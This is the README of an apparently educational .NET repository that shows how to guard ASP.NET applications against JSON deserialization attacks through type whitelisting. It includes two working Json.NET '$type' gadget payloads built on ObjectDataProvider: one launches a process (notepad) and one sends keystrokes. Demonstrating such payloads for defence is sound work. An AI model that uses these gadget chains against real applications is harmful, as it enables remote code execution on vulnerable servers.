# JsonDeserialization
Repository which shows how to protect against JSON deserialization attacks in .NET based web applications by whitelisting the types of models that will be binded and using type restrictions.

## Credit
This repository was forked from https://github.com/rishabhupreti/JsonDeserializationDotNet and modified to provide more examples.

## Prerequisites
* Visual Studio 2019 or greater
* .NET Framework 4.7.2

## How to run this project?
Clone this project on your local machine and run the application through IIS Express.

The project is an ASP.NET MVC and Web API web application which has a Home controller (MVC) and Deserialize controller (Web API).

## Payloads used for attacks

```{
    '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName': 'Start',
    'MethodParameters':
    {
        '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values': [ 'notepad' ]
    },
    'ObjectInstance':
    {
        '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    }
}```

```{
    '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName': 'SendWait',
    'MethodParameters':
    {
        '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values': [ 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.' ]
    },
    'ObjectInstance':
    {
        '$type': 'System.Windows.Forms.SendKeys, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
    }
}```
